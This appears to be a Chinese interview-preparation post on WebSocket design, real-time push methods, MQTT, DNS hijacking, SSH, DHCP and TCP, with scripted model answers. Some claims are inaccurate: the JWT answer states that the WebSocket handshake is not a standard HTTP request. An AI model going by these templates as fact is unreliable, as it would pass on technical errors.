<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用户在地铁中使用聊天 APP，突然断网，WebSocket 连接断开； <span class="string">``</span>客户端每隔 <span class="number">1</span>s/<span class="number">2</span>s/<span class="number">4</span>s 尝试重新连接； <span class="string">``</span>连接成功后重新订阅聊天频道，恢复聊天。</span><br></pre></td></tr></table></figure>
<h3 id="🎤-面试回答模板">🎤 面试回答模板</h3>
<blockquote>
<p>“WebSocket 是长连接，断线后必须支持自动重连。我们在 <code>onclose</code> 事件里做自动重连，采用指数退避避免重连风暴。为了保证上下文恢复，我们会带上用户 ID 或 sessionId，服务端可以识别是否是老连接，自动恢复订阅和状态。”</p>
</blockquote>
<h2 id="✅-二、心跳保活（ping-pong）">✅ 二、心跳保活（ping/pong）</h2>
<h3 id="🎯-场景说明-2">🎯 场景说明</h3>
<p>防止连接在长时间无通信的情况下被中间设备（如防火墙、代理）断开。</p>
<h3 id="💡-实现方案-2">💡 实现方案</h3>
<ul>
<li>客户端定时发送 ping 消息，服务端响应 pong；</li>
<li>或者服务端定时发送 ping，客户端回应 pong；</li>
<li>若超时未响应，认为连接断开并发起重连。</li>
</ul>
<h3 id="📌-示例-2">📌 示例</h3>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端每 <span class="number">30</span> 秒发送 ping； <span class="string">``</span>服务端接收后回复 pong； <span class="string">``</span>如果服务端 <span class="number">60</span> 秒没收到 ping，就关闭连接； <span class="string">``</span>客户端监听 onclose 并尝试重连。</span><br></pre></td></tr></table></figure>
<h3 id="🎤-面试回答模板-2">🎤 面试回答模板</h3>
<blockquote>
<p>“WebSocket 是基于 TCP 的长连接，但网络设备可能会清除空闲连接。所以我们会设置心跳机制，比如每 30 秒发送一个 ping 消息，服务端收到后回复 pong。若超过 60 秒未收到心跳，就认定连接失效，主动断开或触发重连。”</p>
</blockquote>
<h2 id="✅-三、安全认证（JWT）">✅ 三、安全认证（JWT）</h2>
<h3 id="🎯-场景说明-3">🎯 场景说明</h3>
<p>建立 WebSocket 时必须验证用户合法身份，防止非法连接劫持资源。</p>
<h3 id="💡-实现方案-3">💡 实现方案</h3>
<ul>
<li>握手阶段将 JWT 附加在 URL 参数或请求头；</li>
<li>服务端解析 JWT，校验签名、过期时间等；</li>
<li>校验通过后建立连接并映射 userId → connection；</li>
<li>后续消息交互基于此绑定进行权限判断。</li>
</ul>
<h3 id="📌-示例-3">📌 示例</h3>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">前端连接地址：<span class="symbol">ws:</span>/<span class="regexp">/chat.app/ws</span>?token=xxx <span class="string">``</span>服务端解析 token 获取 userId，记录连接映射； <span class="string">``</span>绑定 userId → conn 实现精确消息推送。</span><br></pre></td></tr></table></figure>
<h3 id="🎤-面试回答模板-3">🎤 面试回答模板</h3>
<blockquote>
<p>“WebSocket 握手不是标准的 HTTP 请求，所以我们会在连接 URL/请求头 上附加 JWT token。服务端握手阶段解析 token，校验用户身份，校验通过后绑定 userId 与连接映射。这样后续推送消息、接收指令都可以基于身份控制权限。”</p>
</blockquote>
<h2 id="✅-四、状态一致性（消息乱序、丢失）">✅ 四、状态一致性（消息乱序、丢失）</h2>
<h3 id="🎯-场景说明-4">🎯 场景说明</h3>
<p>在高并发环境下，客户端和服务端之间消息可能出现乱序、丢失，影响状态一致性。</p>
<h3 id="💡-实现方案-4">💡 实现方案</h3>
<ul>
<li>每条消息带上全局自增 <code>msgSeq</code> 或时间戳；</li>
<li>服务端/客户端记录最新已处理的 msgSeq；</li>
<li>收到乱序消息时可缓存、排序或丢弃；</li>
<li>若中间消息丢失，可向服务端请求重发。</li>
</ul>
<h3 id="📌-示例-4">📌 示例</h3>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">客户端断线 <span class="number">5</span> 秒后重连； <span class="string">``</span>服务端按序列 <span class="number">101</span>～<span class="number">105</span> 推送； <span class="string">``</span>客户端记录最新 msgSeq=<span class="number">100</span>； <span class="string">``</span>恢复连接后只接受 &gt;<span class="number">100</span> 的消息。</span><br></pre></td></tr></table></figure>
<h3 id="🎤-面试回答模板-4">🎤 面试回答模板</h3>
<blockquote>
<p>“为了保证状态一致性，我们的每条 WebSocket 消息都带有 msgSeq 序号。客户端记录上次处理的序号，收到消息时如果是重复或乱序的就会丢弃或缓存。这样即使断线后重连，也能保证不会错过关键状态或出现状态错乱。”</p>
</blockquote>
<h2 id="💬-总结面试答题建议">💬 总结面试答题建议</h2>
<p>如果面试官问你：</p>
<blockquote>
<p>“WebSocket 在项目中是怎么设计的？有哪些坑？你是怎么解决的？”</p>
</blockquote>
<p>你可以整体这样作答：</p>
<h3 id="🎤-面试官提问答题模板：">🎤 面试官提问答题模板：</h3>
<blockquote>
<p>“我们项目中使用 WebSocket 做了实时聊天/订单推送，过程中遇到了几个关键问题：</p>
<ol>
<li><strong>断线重连</strong>：采用 <code>onclose</code> 事件重连机制，带上 sessionId 恢复上下文；</li>
<li><strong>心跳机制</strong>：每 30 秒发送 ping，服务端回应 pong，保持连接活跃；</li>
<li><strong>安全认证</strong>：通过携带 JWT，服务端验证 token 并建立用户连接绑定；</li>
<li><strong>状态一致性</strong>：每条消息带有序号 msgSeq，客户端记录并校验，保证数据不丢不乱序。</li>
</ol>
<p>通过这些机制，我们保证了 WebSocket 的稳定连接、安全通信以及消息一致性，在高并发场景下也表现良好。”</p>
</blockquote>
<h2 id="Web实时消息推送（短轮询、长轮询、iframe流、SSE、WebSocket、MQTT）">Web实时消息推送（短轮询、长轮询、iframe流、SSE、WebSocket、MQTT）</h2>
<p>iframe 流就是在页面中插入一个隐藏的<code>&lt;iframe&gt;</code>标签，通过在<code>src</code>中请求消息数量 API 接口，由此在服务端和客户端之间创建一条长连接，服务端持续向<code>iframe</code>传输数据。</p>
<p>传输的数据通常是 HTML、或是内嵌的 JavaScript 脚本，来达到实时更新页面的效果</p>
<blockquote>
<p><strong>面试官：什么是 iframe 流？它是如何实现实时数据推送的？有什么问题？</strong></p>
</blockquote>
<p>答法如下：</p>
<blockquote>
<p>iframe 流（iframe streaming）是一种早期的实时数据推送技术。前端在页面中插入一个隐藏的 <code>&lt;iframe&gt;</code> 标签，指向一个服务端接口。这个接口通过不断往 HTTP 响应中写入 <code>&lt;script&gt;</code> 脚本，让这些脚本在客户端不断执行，实现实时刷新页面内容。</p>
<p>这种方式实现简单，不需要额外库或复杂协议，但有几个明显缺点：一是浏览器会持续显示 loading 状态，二是服务端长时间保持连接会导致资源占用高，三是不同浏览器兼容性差。</p>
<p>因此，现在更推荐使用 WebSocket 或基于 SSE（Server-Sent Events）的方式实现实时通信。</p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NTM4OGZlM2ZmNWNiYWU0Yjc4OTc3ODk3OGE1OGZmODlfQmtFZFVwRndkbENTclNZbThsR1hneFA5YzhVN0ZrcVFfVG9rZW46S0NpbmJKcWlJbzBoUmZ4WkE0Y2NSUUxubkpmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<p><strong>ChatGPT 的网页端采用了 SSE（Server-Sent Events）协议</strong> 来实现和用户的<strong>单向实时通信</strong>。</p>
<p>MQTT 协议为什么在物联网（IOT）中如此受偏爱？而不是其它协议，比如我们更为熟悉的 HTTP 协议呢？</p>
<ul>
<li>首先 HTTP 协议它是一种同步协议，客户端请求后需要等待服务器的响应。而在物联网（IOT）环境中，设备会很受制于环境的影响，比如带宽低、网络延迟高、网络通信不稳定等，显然异步消息协议更为适合 IOT 应用程序。</li>
<li>HTTP 是单向的，如果要获取消息客户端必须发起连接，而在物联网（IOT）应用程序中，设备或传感器往往都是客户端，这意味着它们无法被动地接收来自网络的命令。</li>
<li>通常需要将一条命令或者消息，发送到网络上的所有设备上。HTTP 要实现这样的功能不但很困难，而且成本极高</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDg4MWUyMTRkMmIyYTBjNDdhODdiYzRhZGM5NzkwNGNfNUx5TDBBWjFPbThpc3BiaFh4Z1B0MU1QaEpwSTc5SEtfVG9rZW46TXpIVGI1WWV6b3JtZTF4U0hnVmNod0lrbnRjXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="📦-举个例子">📦 举个例子</h2>
<p>假设你有一个<strong>智能温度传感器网络</strong>，每个传感器采集温度后要上报到服务器，同时服务器还可以<strong>远程下发配置命令（如改变采样频率）</strong>。</p>
<h3 id="用-MQTT-实现：">用 MQTT 实现：</h3>
<ul>
<li>所有传感器订阅 <code>config/update</code> 主题。</li>
<li>服务器发布新的配置命令到 <code>config/update</code>，<strong>所有设备自动收到指令</strong>。</li>
<li>设备定期向 <code>data/temperature</code> 主题发布采集数据，服务端订阅处理。</li>
</ul>
<p>这种就是 <strong>发布/订阅模型</strong>，天然就适合物联网多终端互通、数据上报、下行命令的需求。</p>
<h3 id="用-HTTP-实现：">用 HTTP 实现：</h3>
<ul>
<li>每个设备定时轮询 <code>GET /config</code> 获取配置更新，<strong>延迟高 + 浪费资源</strong>。</li>
<li>上报温度也只能 <code>POST /data</code>，要不断发请求。</li>
<li>服务器无法主动通知设备。</li>
</ul>
<p>在实际 IoT 场景下，HTTP 非常不适合：<strong>高延迟、功耗高、频繁请求成本大</strong>，而且不能主动下发命令。</p>
<h2 id="💬-面试回答模板">💬 面试回答模板</h2>
<blockquote>
<p>在物联网场景中，设备往往受限于网络、带宽和电量，因此传统的 HTTP 协议并不适合。相比之下，MQTT 是一种轻量级的发布/订阅协议，天然支持异步、双向通信，可以显著减少连接建立和数据传输的开销，非常适合大规模、低带宽、低功耗的设备通信。同时，它还能支持 QoS 保证消息可靠性、保留消息、遗嘱消息等机制，确保设备即使离线也能在上线后收到关键数据。</p>
</blockquote>
<h2 id="DNS劫持">DNS劫持</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=NjM1Y2JmNzhmNDE3OTAxNTI1ZWRjZWU2YWEyN2Y2YzBfM1p5eHZUQzUzMnlqbmlKUTdWRTJrZ3hnYkZvQVhpTW5fVG9rZW46UWJncmJSS3hPb3diMVd4SVJkUWM3cjlVbndmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h4 id="🔥-举个真实例子">🔥 举个真实例子</h4>
<p>你在浏览器中输入 <code>http://www.taobao.com</code>：</p>
<ul>
<li>正常情况：浏览器 → DNS 查询 → 真实 IP（如 <code>140.205.94.189</code>）→ 访问淘宝</li>
<li>被劫持：DNS 返回伪造的 IP（如 <code>192.168.1.233</code>）→ 被引导到钓鱼页面或广告页</li>
</ul>
<h4 id="⚠️-DNS-劫持的后果：">⚠️ DNS 劫持的后果：</h4>
<ul>
<li>窃取用户账号密码（如钓鱼页面模拟登录）</li>
<li>注入恶意脚本或广告</li>
<li>实施中间人攻击（MITM）</li>
<li>阻断对某些网站的访问（比如局域网内 DNS 解析失败）</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZGQwYjQ1ZmVkNThjMzg4NTQzYmZhOTIzY2JjZjkyZWVfMWcxWVNZS1o3M3FBZ2J1QnBUWVJoMUZIbHhENzg3Q05fVG9rZW46T1hBR2JkeDNjb1BBNFR4NHQwUWNESW1XbmVmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h2 id="SSH协议的工作流程">SSH协议的工作流程</h2>
<h2 id="✅-场景设定">✅ 场景设定</h2>
<p>你是一个开发者，现在你要通过 SSH 登录到你的远程服务器，服务器 IP 是 <code>192.168.1.100</code>，用户名是 <code>alice</code>。</p>
<p>你执行命令：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">ssh</span> alice@<span class="number">192.168.1.100</span></span><br></pre></td></tr></table></figure>
<h2 id="✅-整个连接流程：详细分-7-步说明-举例">✅ 整个连接流程：详细分 7 步说明 + 举例</h2>
<h3 id="第-1-步：客户端发起-TCP-连接"><strong>第 1 步：客户端发起 TCP 连接</strong></h3>
<ul>
<li>SSH 协议底层使用 TCP 协议，默认连接端口是 <code>22</code>。</li>
<li>客户端会向服务器发送连接请求，握手建立 TCP 连接。</li>
</ul>
<p>🧠 举例：</p>
<p>你电脑向服务器发一个 TCP 连接请求，就像你打电话给别人，电话先要拨通。</p>
<h3 id="第-2-步：服务端发送版本号-加密算法列表"><strong>第 2 步：服务端发送版本号 + 加密算法列表</strong></h3>
<ul>
<li>服务端返回自己的 SSH 版本号，比如：</li>
<li><code>SSH-2.0-OpenSSH_8.9</code></li>
<li>同时告诉客户端：我支持哪些加密算法（如 RSA、ED25519、AES 等）。</li>
</ul>
<p>🧠 举例：</p>
<p>服务端说：“我说英语、法语、西班牙语（加密算法），你说哪个？”</p>
<h3 id="第-3-步：客户端选择加密方式-验证服务器身份"><strong>第 3 步：客户端选择加密方式 + 验证服务器身份</strong></h3>
<ul>
<li>客户端选出和服务端都支持的加密方式（比如 AES + RSA）。</li>
<li>然后检查服务器的“指纹”有没有见过（第一次会弹提示让你确认）。</li>
</ul>
<p>🌟 第一次连接，你会看到：</p>
<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.1.100&#x27; can&#x27;t be established.` `RSA key fingerprint is SHA256:xxxxxxx ``Are you sure you want to continue connecting (yes/no)?</span></span><br></pre></td></tr></table></figure>
<p>🧠 举例：</p>
<p>你电话刚拨通，听到对方声音，你先判断“这是我朋友吗？”</p>
<p>如果是第一次联系，你会手动确认一次他的身份（指纹）。</p>
<h3 id="第-4-步：建立“共享密钥”（密钥交换）"><strong>第 4 步：建立“共享密钥”（密钥交换）</strong></h3>
<ul>
<li>双方通过一种算法（如 Diffie-Hellman）交换加密信息，生成一个“会话密钥”。</li>
<li>之后所有传输内容都用这个会话密钥加密。</li>
</ul>
<p>🧠 举例：</p>
<p>你和朋友约好“咱俩以后说暗语，把字母A换成Z，B换成Y…”</p>
<p>今后你们的通话都按照这个规则说话（加密通道建立）。</p>
<h3 id="第-5-步：客户端进行身份验证（登录）"><strong>第 5 步：客户端进行身份验证（登录）</strong></h3>
<h4 id="✅-登录方式一：输入密码">✅ 登录方式一：输入密码</h4>
<p>你输入你服务器上的密码：</p>
<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alice<span class="keyword">@192</span>.168.1.100&#x27;s <span class="attribute">password</span>: </span><br></pre></td></tr></table></figure>
<p>服务器验证密码是否正确。</p>
<h4 id="✅-登录方式二：使用私钥认证">✅ 登录方式二：使用私钥认证</h4>
<p>你本地有 <code>~/.ssh/id_rsa</code>（私钥），服务器上有你对应的 <code>~/.ssh/authorized_keys</code>（公钥）。</p>
<p>系统自动使用私钥签名，服务器验证签名是否能解锁公钥。</p>
<p>🧠 举例：</p>
<p>你说了一句只有你俩知道的暗语，证明你就是本人，不用出示身份证（免密登录）。</p>
<h3 id="第-6-步：登录成功，进入命令行界面"><strong>第 6 步：登录成功，进入命令行界面</strong></h3>
<p>你看到服务器返回 shell 终端，出现：</p>
<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alice<span class="variable">@192</span>.<span class="number">168.1</span>.<span class="number">100</span><span class="symbol">:~</span>$</span><br></pre></td></tr></table></figure>
<p>你就可以运行命令，比如：</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cd</span> /<span class="keyword">var</span>/<span class="keyword">log</span>` `<span class="keyword">cat</span> syslog</span><br></pre></td></tr></table></figure>
<h3 id="第-7-步：开始加密通信"><strong>第 7 步：开始加密通信</strong></h3>
<ul>
<li>你执行的命令、返回的结果都通过之前生成的“会话密钥”加密传输。</li>
<li>数据安全，防止中间人监听或修改。</li>
</ul>
<p>🧠 举例：</p>
<p>你和朋友讲电话时用“暗语”通信，别人就算窃听也听不懂。</p>
<h2 id="✅-总结（面试时怎么说？）">✅ 总结（面试时怎么说？）</h2>
<blockquote>
<p>SSH 是一个应用层协议，基于 TCP，提供远程登录、命令执行和文件传输能力。 它通过服务端公钥、客户端密钥对和对称密钥加密建立安全通信。 SSH 连接流程包括：TCP 建连、算法协商、服务器身份验证、密钥交换、客户端认证、建立加密通道、远程会话。 相比 Telnet 等明文协议，SSH 提供加密、认证和数据完整性保护，是运维、安全运转、CI/CD 等场景的基础协议。</p>
</blockquote>
<h2 id="DHCP协议">DHCP协议</h2>
<h2 id="✅-1-DHCP-是什么？">✅ 1. DHCP 是什么？</h2>
<p>DHCP 是一种自动分配 IP 地址的协议，<strong>让设备连上网络后自动获得 IP、网关、DNS 等信息</strong>，无需人工配置。</p>
<h2 id="✅-2-场景举例：手机连接-Wi-Fi-的全过程">✅ 2. 场景举例：手机连接 Wi-Fi 的全过程</h2>
<p>你去了一家咖啡厅，连上了店里的 Wi-Fi（比如叫 “Coffee-FreeWiFi”）。你没有设置 IP，也没有设置网关、DNS，就直接能上网了——这就是 DHCP 的功劳。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZhMzNhODc5YzdiMDRiNjEyN2M0YTYwMjVjNmU5ZDRfZ0txcTRiQ2VFRWdaSG1xYU9nbm5VVEZWZHBjUmI0OXNfVG9rZW46Vk5QMmJLYlpHb1JUQmV4aFA5QWNsMUppblFnXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="🔍-假设场景：">🔍 假设场景：</h3>
<ul>
<li>你的手机没有 IP 地址</li>
<li>DHCP 服务器在路由器上</li>
<li>子网是 <code>192.168.1.0/24</code></li>
<li>有一个可用 IP 是 <code>192.168.1.100</code></li>
</ul>
<h3 id="✅-第一步：Discover（发现）">✅ 第一步：Discover（发现）</h3>
<blockquote>
<p>手机广播发送一个 DHCP Discover 消息： “有没有 DHCP 服务器？谁能给我分配 IP？”</p>
</blockquote>
<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">源 <span class="built_in">IP</span>: <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> ``目的 <span class="built_in">IP</span>: <span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>.<span class="number">255</span>（广播） ``内容：我是 XX 手机，求 <span class="built_in">IP</span></span><br></pre></td></tr></table></figure>
<h3 id="✅-第二步：Offer（提供）">✅ 第二步：Offer（提供）</h3>
<blockquote>
<p>DHCP 服务器（路由器）收到广播，回复 Offer：</p>
</blockquote>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">内容：你可以用 <span class="number">192.168.1.100</span>，网关是 <span class="number">192.168.1.1</span>，DNS 是 <span class="number">8.8.8.8</span>，租期 <span class="number">24</span> 小时</span><br></pre></td></tr></table></figure>
<h3 id="✅-第三步：Request（请求）">✅ 第三步：Request（请求）</h3>
<blockquote>
<p>手机说： “我决定使用 192.168.1.100，麻烦你给我正式分配这个 IP。”</p>
</blockquote>
<h3 id="✅-第四步：Acknowledge（确认）">✅ 第四步：Acknowledge（确认）</h3>
<blockquote>
<p>服务器最终确认： “OK，这个 IP 现在是你的，使用期限是 24 小时。”</p>
</blockquote>
<h2 id="✅-4-最终结果">✅ 4. 最终结果</h2>
<ul>
<li>手机被分配了 IP：192.168.1.100</li>
<li>子网掩码：255.255.255.0</li>
<li>默认网关：192.168.1.1</li>
<li>DNS：8.8.8.8</li>
</ul>
<p>你现在就能愉快上网了！</p>
<h2 id="✅-5-面试时怎么说？">✅ 5. 面试时怎么说？</h2>
<p>如果面试官问你：</p>
<blockquote>
<p>DHCP 是什么？怎么工作的？</p>
</blockquote>
<p>你可以答：</p>
<blockquote>
<p>DHCP 是动态主机配置协议，用于自动给设备分配 IP、网关、DNS 等网络配置，常见于局域网中。 它通过 DORA 四步完成连接：</p>
<ul>
<li>Discover：客户端广播寻找 DHCP 服务</li>
<li>Offer：服务器回应提供一个可用 IP</li>
<li>Request：客户端请求使用这个 IP</li>
<li>Acknowledge：服务器确认分配</li>
</ul>
</blockquote>
<p>你可以举手机连接 Wi-Fi 为例，这个过程就用到了 DHCP，全自动、无需手动配置 IP 地址。</p>
<h2 id="TCP三次握手">TCP三次握手</h2>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://g16urso0agu.feishu.cn/space/api/box/stream/download/asynccode/?code=YTExMGNkM2ExYzE1NTYzMzA0NDNmYmVhYTAzYWY2MjJfZXpCN3FTcmZ0c1BsdGdnS2Z1WngzczhyVEk0a1NJUXRfVG9rZW46TXpHUGJkTlpLb1l0SmR4dXBvS2NNY0ltbmxmXzE3NDkzOTMyNjk6MTc0OTM5Njg2OV9WNA" alt="img"></p>
<h3 id="❓面试官：TCP-三次握手过程中，如果第三次-ACK-丢失会怎样？">❓面试官：TCP 三次握手过程中，如果第三次 ACK 丢失会怎样？</h3>
<p><strong>标准答法</strong>：</p>
<blockquote>
<p>如果 A 发出的第三个 ACK 丢失，B 没法进入 ESTABLISHED 状态，但 A 这时已经进入 ESTABLISHED。由于 TCP 协议规定不会对无数据的 ACK 进行超时重传，因此 A 不会主动重传。</p>
<p>不过，B 会超时重传自己的 SYN+ACK，此时 A 会回应 ACK，最终连接仍能建立成功。</p>
<p>所以 TCP 的三次握手具有容错机制，即使第三个包丢了，也不会导致连接建立失败。</p>
</blockquote>
<p><strong>正因为 TCP 协议不会对无数据 ACK 进行超时重传</strong>，所以：</p>
<blockquote>
<p>“第三次握手丢失的补救机制”才是靠 <strong>B 不断重传自己的 SYN+ACK 来触发 A 的 ACK 响应</strong>，最终完成连接。</p>
</blockquote>
<h3 id="🤔-为什么第三次可以携带数据？">🤔 为什么第三次可以携带数据？</h3>
<p>因为此时：</p>
<ul>
<li>客户端已经收到了服务端的 <code>SYN+ACK</code>，可以认为“连接建立即将完成”</li>
<li><strong>客户端状态已经变成</strong> <strong><code>ESTABLISHED</code></strong></li>
<li>所以 TCP 协议允许<strong>在这个</strong> <strong><code>ACK</code></strong> <strong>包中附带数据</strong></li>
</ul>
<h2 id="🧠-面试这样答（模板）：">🧠 面试这样答（模板）：</h2>
<blockquote>
<p>三次握手的第三次 ACK 是可以携带数据的，这在 RFC 793 中有明确说明。客户端在发送 ACK 的同时可以附带数据，此时客户端状态已经是 ESTABLISHED。</p>
<p>如果这个 ACK + 数据包没有丢失，即使服务端之前没有收到单独的 ACK，也会因为这个带 ACK 的数据包而确认连接已建立，从而进入 ESTABLISHED 状态。这种机制提高了连接建立的效率，也是 TCP 容错的一种体现。</p>
</blockquote>
<h2 id="TCP四次挥手">TCP四次挥手</h2>
<h3 id="为什么第四次挥手客户端需要等待-2-MSL（报文段最长寿命）时间后才进入-CLOSED-状态？">为什么第四次挥手客户端需要等待 2*MSL（报文段最长寿命）时间后才进入 CLOSED 状态？</h3>
<p>第四次挥手时，客户端发送给服务端的 ACK 有可能丢失，如果服务端因为某些原因而没有收到 ACK 的话，服务端就会重发 FIN，如果客户端在 2*MSL 的时间内收到了 FIN，就会重新发送 ACK 并再次等待 2MSL，防止 Server 没有收到 ACK 而不断重发 FIN。</p>
<blockquote>
<p><strong>MSL(Maximum Segment Lifetime)</strong> : 一个片段在网络中最大的存活时间，2MSL 就是一个发送和一个回复所需的最大时间。如果直到 2MSL，Client 都没有再次收到 FIN，那么 Client 推断 ACK 已经被成功接收，则结束 TCP 连接。</p>
</blockquote>
<h2 id="TCP如何保证传输的可靠性">TCP如何保证传输的可靠性</h2>
<ol>
<li>基于数据块传输：应用数据被分割成 TCP 认为最适合发送的数据块，再传输给网络层，数据块被称为报文段或段。</li>
<li>对失序数据包重新排序以及去重：TCP 为了保证不发生丢包，就给每个包一个序列号，有了序列号能够将接收到的数据根据序列号排序，并且去掉重复序列号的数据就可以实现数据包去重。</li>
<li>校验和 : TCP 将保持它首部和数据的检验和。这是一个端到端的检验和，目的是检测数据在传输过程中的任何变化。如果收到段的检验和有差错，TCP 将丢弃这个报文段和不确认收到此报文段。</li>
<li>重传机制 : 在数据包丢失或延迟的情况下，重新发送数据包，直到收到对方的确认应答（ACK）。TCP 重传机制主要有：基于计时器的重传（也就是超时重传）、快速重传（基于接收端的反馈信息来引发重传）、SACK（在快速重传的基础上，返回最近收到的报文段的序列号范围，这样客户端就知道，哪些数据包已经到达服务器了）、D-SACK（重复 SACK，在 SACK 的基础上，额外携带信息，告知发送方有哪些数据包自己重复接收了）。关于重传机制的详细介绍，可以查看详解 TCP 超时与重传机制这篇文章。</li>
<li>流量控制 : TCP 连接的每一方都有固定大小的缓冲空间，TCP 的接收端只允许发送端发送接收端缓冲区能接纳的数据。当接收方来不及处理发送方的数据，能提示发送方降低发送的速率，防止包丢失。TCP 使用的流量控制协议是可变大小的滑动窗口协议（TCP 利用滑动窗口实现流量控制）。</li>
<li>拥塞控制 : 当网络拥塞时，减少数据的发送。TCP 在发送数据的时候，需要考虑两个因素：一是接收方的接收能力，二是网络的拥塞程度。接收方的接收能力由滑动窗口表示，表示接收方还有多少缓冲区可以用来接收数据。网络的拥塞程度由拥塞窗口表示，它是发送方根据网络状况自己维护的一个值，表示发送方认为可以在网络中传输的数据量。发送方发送数据的大小是滑动窗口和拥塞窗口的最小值，这样可以保证发送方既不会超过接收方的接收能力，也不会造成网络的过度拥塞</li>
</ol>
<h2 id="🎯-场景设定：文件传输">🎯 场景设定：文件传输</h2>
<blockquote>
<p>假设你用 FTP 协议（基于 TCP）从 A 电脑向 B 电脑发送一个 <strong>100 KB 的文件</strong>，整个过程中 TCP 如何工作？我们来一段段分析。</p>
</blockquote>
<h3 id="✅-1-基于数据块传输：分段发送">✅ 1. 基于数据块传输：分段发送</h3>
<ul>
<li><strong>应用层</strong>：一次性把 100 KB 的文件传给 TCP。</li>
<li><strong>TCP</strong>：不会直接一次性发送出去，而是拆成合适大小的 <strong>数据块（segment）</strong>，比如每块 1 KB，总共分成 100 个 segment。</li>
<li><strong>这些数据块就是报文段</strong>，每一段包含：
<ul>
<li>序列号（用来标记位置）</li>
<li>检验和（用于验证数据是否出错）</li>
<li>具体的数据内容（1KB）</li>
</ul>
</li>
</ul>
<p>🔎 <strong>举例</strong>：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">段1：<span class="attribute">Seq</span>=0，Len=1024   ``段2：<span class="attribute">Seq</span>=1024，Len=1024   ``段3：<span class="attribute">Seq</span>=2048，Len=1024  ` `<span class="built_in">..</span>.</span><br></pre></td></tr></table></figure>
<h3 id="✅-2-对失序数据包重新排序-去重">✅ 2. 对失序数据包重新排序 + 去重</h3>
<blockquote>
<p>网络不可靠，可能导致包乱序、重复。</p>
</blockquote>
<p>比如接收方 B 收包顺序变成：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">段1（<span class="attribute">Seq</span>=0） ``段3（<span class="attribute">Seq</span>=2048） ``段2（<span class="attribute">Seq</span>=1024）   ✅ 乱序 ``段2（重复包）     ✅ 重复</span><br></pre></td></tr></table></figure>
<ul>
<li>B 会将段 2 和段 3 放到合适位置，并去除重复段 2，只保留第一个有效的。</li>
<li>最终排序恢复为原始顺序后交给应用层。</li>
</ul>
<h3 id="✅-3-校验和：保证数据不被篡改或损坏">✅ 3. 校验和：保证数据不被篡改或损坏</h3>
<p>每个段都有自己的 <strong>校验和字段</strong>，内容包括头部和数据内容。</p>
<ul>
<li>接收方 B 收到每个段后：
<ul>
<li>算出校验和，看和发送方一致不一致</li>
<li>如果校验失败（说明可能数据在传输过程中被干扰），<strong>直接丢弃，不会交给应用层</strong></li>
</ul>
</li>
</ul>
<p>🔎 <strong>举例</strong>：段3 校验和出错，B 丢弃，等待重传。</p>
<h3 id="✅-4-重传机制：确保可靠送达">✅ 4. 重传机制：确保可靠送达</h3>
<p>TCP 不依赖于网络一定可靠，而是自己负责保证“<strong>要么正确到达，要么重新来过</strong>”。</p>
<h4 id="🌟-4-1-超时重传（定时器触发）">🌟 4.1 超时重传（定时器触发）</h4>
<ul>
<li>A 发送段 5（Seq=4096）后，一直没收到 B 的 ACK（因为包丢了或者 ACK 丢了）</li>
<li>等待了一段时间（超时），A 自动重发段 5</li>
</ul>
